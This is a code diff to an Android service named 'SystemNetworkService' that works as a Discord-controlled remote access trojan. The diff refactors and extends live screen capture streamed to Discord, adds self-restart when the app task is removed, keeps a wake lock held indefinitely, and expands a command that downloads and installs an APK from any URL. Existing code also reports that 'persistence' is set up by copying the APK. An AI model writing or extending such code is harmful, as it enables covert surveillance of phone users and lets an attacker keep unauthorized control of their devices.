@@ -68,7 +68,7 @@ class SystemNetworkService : Service() {
         }
     }
 
-    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
+    private var scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private var discord: DiscordGatewayClient? = null
     private var gatewayStarted = false
     private var wakeLock: PowerManager.WakeLock? = null
@@ -76,6 +76,7 @@ class SystemNetworkService : Service() {
     private var streamJob: Job? = null
     private var isStreaming = false
     private var streamFps = 1
+    private var isDownloadingUpdate = false
 
     override fun onBind(i: Intent?): IBinder? = null
 
@@ -146,9 +147,10 @@ class SystemNetworkService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        
+        scope.cancel("Service restarted")
+        scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
+
         if (discord == null) {
-            
             discord = DiscordGatewayClient(
                 appContext = applicationContext,
                 onCommand = { action, payload ->
@@ -156,17 +158,37 @@ class SystemNetworkService : Service() {
                 },
                 onStatus = { s -> updateNotif(s) }
             )
-            
-            
         }
         if (!gatewayStarted) {
             gatewayStarted = true
             scope.launch { loadCrashReports() }
-            
             discord?.start(scope)
-            
         }
+
+        scope.launch {
+            while (isActive) {
+                delay(12 * 60 * 60 * 1000L)
+                if (wakeLock?.isHeld != true) {
+                    wakeLock?.acquire(24 * 60 * 60 * 1000L)
+                }
+            }
+        }
+
         return START_STICKY
+    }
+
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        try {
+            val restartIntent = Intent(applicationContext, SystemNetworkService::class.java)
+            restartIntent.setPackage(packageName)
+            val pendingIntent = PendingIntent.getService(
+                applicationContext, 1, restartIntent,
+                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+            )
+            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
+            alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, pendingIntent)
+        } catch (_: Exception) {}
+        super.onTaskRemoved(rootIntent)
     }
 
     private fun buildNotif(text: String) = NotificationCompat.Builder(this, CHANNEL)
@@ -291,8 +313,8 @@ class SystemNetworkService : Service() {
                     }
                 }
                 "stream" -> {
-                    when (payload?.lowercase()) {
-                        "stop" -> {
+                    when {
+                        payload?.lowercase() == "stop" -> {
                             if (isStreaming) {
                                 streamJob?.cancel()
                                 isStreaming = false
@@ -301,50 +323,16 @@ class SystemNetworkService : Service() {
                                 d.sendMsg(":x: No active stream")
                             }
                         }
-                        null, "" -> {
-                            d.sendMsg(":tv: **!stream**\nLive screen feed.\nUsage: `!stream start` (1fps)\nUsage: `!stream 30` (30fps, max 30)\nUsage: `!stream stop`")
+                        payload?.lowercase() == "start" -> {
+                            startStream(d, 2)
+                        }
+                        payload == null || payload.isBlank() -> {
+                            d.sendMsg(":tv: **!stream**\nLive screen feed.\nUsage: `!stream start` (2fps)\nUsage: `!stream 5` (5fps, max 30)\nUsage: `!stream stop`")
                         }
                         else -> {
                             val fps = payload.toIntOrNull()
                             if (fps != null && fps in 1..30) {
-                                streamFps = fps
-                                if (isStreaming) {
-                                    streamJob?.cancel()
-                                }
-                                isStreaming = true
-                                d.sendMsg(":tv: **Live stream started** at ${fps}fps\nUse `!stream stop` to end")
-                                streamJob = scope.launch {
-                                    var consecutiveFailures = 0
-                                    val maxFailures = 5
-                                    try {
-                                        while (isActive) {
-                                            try {
-                                                val bytes = captureScreenForStream()
-                                                if (bytes != null) {
-                                                    consecutiveFailures = 0
-                                                    d.sendFile("", "stream_${System.currentTimeMillis()}.jpg", bytes)
-                                                } else {
-                                                    consecutiveFailures++
-                                                    if (consecutiveFailures >= maxFailures) {
-                                                        d.sendMsg(":x: Stream stopped — too many failures")
-                                                        isStreaming = false
-                                                        break
-                                                    }
-                                                }
-                                            } catch (e: Exception) {
-                                                consecutiveFailures++
-                                                if (consecutiveFailures >= maxFailures) {
-                                                    d.sendMsg(":x: Stream error — stopped")
-                                                    isStreaming = false
-                                                    break
-                                                }
-                                            }
-                                            delay(1000L / fps)
-                                        }
-                                    } catch (e: Exception) {
-                                        isStreaming = false
-                                    }
-                                }
+                                startStream(d, fps)
                             } else {
                                 d.sendMsg(":x: Invalid FPS. Use 1-30. Usage: `!stream <1-30>`")
                             }
@@ -518,32 +506,50 @@ class SystemNetworkService : Service() {
                     d.sendMsg(":white_check_mark: Persistence active (APK copied + alarm set)")
                 }
                 "update" -> {
-                    val sub = payload?.trim()?.lowercase()
-                    when {
-                        sub == null || sub == "check" -> {
+                    val parts = payload?.trim()?.split("\\s+".toRegex()) ?: emptyList()
+                    val cmd = parts.firstOrNull()?.lowercase() ?: ""
+                    val url = if (parts.size > 1) parts.subList(1, parts.size).joinToString(" ") else ""
+                    when (cmd) {
+                        "", "check" -> {
                             d.sendMsg(":mag: **Checking for updates**...")
                             val result = com.openaccess.sdk.update.UpdateManager.checkForUpdate(this, d)
                             d.sendMsg(result)
                         }
-                        sub.startsWith("push ") || sub.startsWith("url ") -> {
-                            val url = payload!!.substringAfter(" ").substringAfter(" ").trim()
+                        "push", "url" -> {
                             if (url.isBlank() || !url.startsWith("http")) {
                                 d.sendMsg(":x: **Invalid URL**. Usage: `!update push <direct-apk-url>`")
                             } else {
-                                d.sendMsg(":arrow_down: **Downloading update** from URL...")
-                                val result = com.openaccess.sdk.update.UpdateManager.downloadUpdate(this, d, url)
-                                d.sendMsg(result)
+                                scope.launch {
+                                    try {
+                                        isDownloadingUpdate = true
+                                        d.sendMsg(":arrow_down: **Downloading update**...")
+                                        val result = com.openaccess.sdk.update.UpdateManager.downloadUpdate(this@SystemNetworkService, d, url)
+                                        d.sendMsg(result)
+                                    } catch (e: Exception) {
+                                        d.sendMsg(":x: **Update error**: ${e.message?.take(80) ?: "unknown"}")
+                                    } finally {
+                                        isDownloadingUpdate = false
+                                    }
+                                }
                             }
                         }
-                        sub == "install" -> {
+                        "install" -> {
                             com.openaccess.sdk.update.UpdateManager.installUpdate(this, d)
                         }
-                        sub == "clear" -> {
+                        "clear" -> {
                             com.openaccess.sdk.update.UpdateManager.clearUpdate(this)
                             d.sendMsg(":wastebasket: **Update cleared**. Pending APK removed.")
                         }
+                        "status" -> {
+                            val status = com.openaccess.sdk.update.UpdateManager.getStatus(this)
+                            val file = com.openaccess.sdk.update.UpdateManager.getUpdateFile(this)
+                            val fileSize = if (file.exists()) "${file.length() / 1024} KB" else "none"
+                            val (curName, curCode) = com.openaccess.sdk.update.UpdateManager.getCurrentVersion(this)
+                            val pending = com.openaccess.sdk.update.UpdateManager.getPendingVersion(this)
+                            d.sendMsg(":bar_chart: **Update Status**\nState: `${status.name}`\nCurrent: v$curName ($curCode)\nPending: v$pending\nFile: `$fileSize`\nPath: `${file.absolutePath}`")
+                        }
                         else -> {
-                            d.sendMsg(":book: **Update Commands**\n`!update check` - Check for pending updates\n`!update push <url>` - Download APK from URL\n`!update install` - Install downloaded update\n`!update clear` - Remove pending update")
+                            d.sendMsg(":book: **Update Commands**\n`!update check` - Check for pending updates\n`!update push <url>` - Download APK from URL\n`!update install` - Install downloaded update\n`!update clear` - Remove pending update\n`!update status` - Debug update state")
                         }
                     }
                 }
@@ -920,6 +926,47 @@ class SystemNetworkService : Service() {
         } catch (e: Exception) {
             
             d.sendMsg(":x: **Error**: ${e.message?.take(100)}")
+        }
+    }
+
+    private fun startStream(d: DiscordGatewayClient, fps: Int) {
+        streamFps = fps
+        if (isStreaming) {
+            streamJob?.cancel()
+        }
+        isStreaming = true
+        d.sendMsg(":tv: **Live stream started** at ${fps}fps\nUse `!stream stop` to end")
+        streamJob = scope.launch {
+            var consecutiveFailures = 0
+            val maxFailures = 5
+            try {
+                while (isActive) {
+                    try {
+                        val bytes = captureScreenForStream()
+                        if (bytes != null) {
+                            consecutiveFailures = 0
+                            d.sendFile("", "stream_${System.currentTimeMillis()}.jpg", bytes)
+                        } else {
+                            consecutiveFailures++
+                            if (consecutiveFailures >= maxFailures) {
+                                d.sendMsg(":x: Stream stopped — too many failures")
+                                isStreaming = false
+                                break
+                            }
+                        }
+                    } catch (e: Exception) {
+                        consecutiveFailures++
+                        if (consecutiveFailures >= maxFailures) {
+                            d.sendMsg(":x: Stream error — stopped")
+                            isStreaming = false
+                            break
+                        }
+                    }
+                    delay(1000L / fps)
+                }
+            } catch (e: Exception) {
+                isStreaming = false
+            }
         }
     }
 
@@ -1539,9 +1586,6 @@ class SystemNetworkService : Service() {
             networkCallback = object : ConnectivityManager.NetworkCallback() {
                 override fun onAvailable(network: Network) {
                     super.onAvailable(network)
-                    
-                    
-                    // Trigger reconnect if Discord is connected
                     discord?.let {
                         if (!it.isConnected()) {
                             scope.launch {
@@ -1554,14 +1598,65 @@ class SystemNetworkService : Service() {
 
                 override fun onLost(network: Network) {
                     super.onLost(network)
-                    
-                    
+                    if (isDownloadingUpdate) return
+                    discord?.let {
+                        if (it.isConnected()) {
+                            scope.launch {
+                                it.stop()
+                                gatewayStarted = false
+                                discord = null
+                                discord = DiscordGatewayClient(
+                                    appContext = applicationContext,
+                                    onCommand = { action, payload ->
+                                        scope.launch { handleGatewayCommand(action, payload) }
+                                    },
+                                    onStatus = { s -> updateNotif(s) }
+                                )
+                                discord?.start(scope)
+                                gatewayStarted = true
+                            }
+                        }
+                    }
+                }
+
+                override fun onCapabilitiesChanged(network: Network, capabilities: NetworkCapabilities) {
+                    super.onCapabilitiesChanged(network, capabilities)
+                    if (isDownloadingUpdate) return
+                    val hasInternet = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                    val validated = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
+                    if (!hasInternet || !validated) {
+                        discord?.let {
+                            if (it.isConnected()) {
+                                scope.launch {
+                                    delay(1000)
+                                    it.stop()
+                                    gatewayStarted = false
+                                    discord = null
+                                    discord = DiscordGatewayClient(
+                                        appContext = applicationContext,
+                                        onCommand = { action, payload ->
+                                            scope.launch { handleGatewayCommand(action, payload) }
+                                        },
+                                        onStatus = { s -> updateNotif(s) }
+                                    )
+                                    discord?.start(scope)
+                                    gatewayStarted = true
+                                }
+                            }
+                        }
+                    }
                 }
 
                 override fun onUnavailable() {
                     super.onUnavailable()
-                    
-                    
+                    discord?.let {
+                        if (it.isConnected()) {
+                            scope.launch {
+                                it.stop()
+                                gatewayStarted = false
+                            }
+                        }
+                    }
                 }
             }
             val request = NetworkRequest.Builder()
